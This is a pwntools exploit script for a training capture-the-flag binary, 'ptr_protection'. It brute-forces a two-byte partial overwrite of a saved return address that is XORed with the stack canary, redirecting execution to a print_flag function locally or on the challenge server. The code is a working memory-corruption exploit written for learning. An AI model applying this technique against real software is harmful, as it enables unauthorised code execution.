from pwn import *

# keeps writing one byte at a specified offset from the start of the buffer, until the inserted offset is -1

PROG = "./ptr_protection"
COMMANDS = """
b main
brva 0x14E0
c
"""

context.arch="amd64"

# brute forcing address of funct print_flag
# here the issue was that before starting a method, the srip was xored with the canary, and de-xored before returning
# busillis: last byte of the canary is always \0 => last byte of srip never changes => the one we write will stay as is
while(1):
  if args.GDB :
      c = gdb.debug(PROG, COMMANDS)
  elif args.REMOTE:
      c = remote("ptr-protection.training.offensivedefensive.it", 8080, ssl=True)
  else:
      c = process(PROG)

  win = [0x7c, 0x00]  #0x127c is the real offset of prnt_flag but the program only moves one byte on the specified address (rbp + rax + 0x20) and the second last byte is xored with a not null canary byte (so it is simpler to keep the second last canary byte also in the ret addr)
  offset = 40

  # overwriting the last two bytes of srip with 0x007c
  # the brute force stays in having the second last byte of the ret addr equal to the one of the canary
  for i in range(2) :
    c.recvuntil(b'index: ')
    c.sendline(bytes(str(offset + i), 'utf-8'))
    c.recvuntil(b'data: ')
    c.sendline(bytes(str(win[i]), 'utf-8'))

  c.recvuntil(b'index: ')
  c.sendline(b'-1')   # making the function challenge return to main
  print(c.recvline()) # return address printf challenge 

  try:
    c.recvuntil(b"WIN!\n", timeout=1)
    message = c.recvline()
    print(message)
    break
  except EOFError:
    print()
  finally:    
    c.close()
